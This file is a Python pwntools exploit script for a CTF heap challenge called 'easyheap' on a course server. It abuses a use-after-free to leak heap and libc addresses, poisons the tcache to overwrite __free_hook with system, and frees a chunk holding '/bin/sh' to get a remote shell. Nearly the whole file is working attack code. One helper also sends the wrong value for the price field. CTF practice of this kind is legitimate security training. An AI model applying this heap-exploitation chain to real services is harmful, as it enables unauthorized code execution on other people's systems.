from pwn import *

# Context Setting
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

# GDB Debug Script
GDB_INIT = """
    b add_book
    b delete_book
    b edit_book
"""

# r = process("./easyheap/share/easyheap")
r = remote("edu-ctf.zoolab.org", 30211)

# The Pwn Goal here is the same as final. The only difference is that we can't write arbitrary length of
# user input. But this shouldn't be a problem. We can proceed with tcache chain poisoning with only 0x10 byte
# write of the memory content.

# Communication Function
def add_book(idx: int, name_len: int, book_name: str, price: int):
    info(f"[CMD]: add_book at {idx}, {book_name}({name_len}) with price of {price}")
    r.sendlineafter(b"> ", b"1")

    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Length of name: ", str(name_len).encode())
    r.sendlineafter(b"Name: ", book_name.encode())
    r.sendlineafter(b"Price: ", str(int).encode())

def delete_book(idx: int):
    info(f"[CMD]: delete_book at index {idx}")
    r.sendlineafter(b"> ", b"2")

    r.sendlineafter(b"Which book do you want to delete: ", str(idx).encode())

def edit_book(idx: int, name: bytes, price: int=1234):
    info(f"[CMD]: edit_book at index {idx}")
    r.sendlineafter(b"> ", b"3")
    
    r.sendlineafter(b"Which book do you want to edit: ", str(idx).encode())
    r.sendlineafter(b"Name: ", name)
    r.sendlineafter(b"Price: ", str(price).encode())

def get_name_from_idx(idx: int):
    info(f"[CMD]: get_name_from_idx at index {idx}")
    r.sendlineafter(b"> ", b"5")

    r.sendlineafter(b"Index: ", str(idx).encode())
    r.recvuntil("Name: ")

# Start to PWN
BASE_LIBC = None
BASE_HEAP = None
ADDR_SYSTEM = None
ADDR_FREE_HOOK = None

# Leak Libc Based Address
add_book(0, 0x410, "UAF-1", 1000)
add_book(1, 0x410, "UAF-2", 1000)
add_book(2, 0x410, "UAF-3", 1000)
delete_book(0)
delete_book(1)
delete_book(2)

get_name_from_idx(2)
BASE_HEAP = u64(r.recv(6).ljust(8, b'\x00')) - 0x2a0

edit_book(1, p64(BASE_HEAP + 0x2c0 + 0x10))
get_name_from_idx(0)
BASE_LIBC = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0

info("[LEAK]: BASE_LIBC: " + hex(BASE_LIBC))

# Hijack Free Hook 2 System
ADDR_SYSTEM = BASE_LIBC + 0x55410
ADDR_FREE_HOOK = BASE_LIBC + 0x1eeb28

edit_book(1, p64(ADDR_FREE_HOOK))
edit_book(0, p64(ADDR_SYSTEM))

add_book(4, 0x8, "/bin/sh", 1000)
delete_book(4)

r.interactive()
